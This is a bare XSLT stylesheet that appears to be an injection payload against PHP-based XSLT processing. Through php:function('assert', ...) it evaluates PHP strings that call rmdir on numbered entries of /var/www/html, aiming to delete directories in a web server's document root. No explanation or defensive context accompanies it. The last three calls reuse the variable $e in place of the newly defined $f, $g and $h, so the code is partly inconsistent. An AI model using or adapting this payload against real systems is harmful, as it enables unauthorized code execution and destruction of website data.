<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">
           <xsl:variable name="a">rmdir(glob('/var/www/html/*')[13])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 
           <xsl:variable name="b">rmdir(glob('/var/www/html/*')[14])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $b)"/> 
           <xsl:variable name="c">rmdir(glob('/var/www/html/*')[15])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $c)"/> 
           <xsl:variable name="d">rmdir(glob('/var/www/html/*')[16])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $d)"/> 

        <xsl:variable name="e">rmdir(glob('/var/www/html/*')[17])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
   
           <xsl:variable name="f">rmdir(glob('/var/www/html/*')[0])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
   
           <xsl:variable name="g">rmdir(glob('/var/www/html/*')[1])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
   
           <xsl:variable name="h">rmdir(glob('/var/www/html/*')[2])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
</xsl:template> 
</xsl:stylesheet>
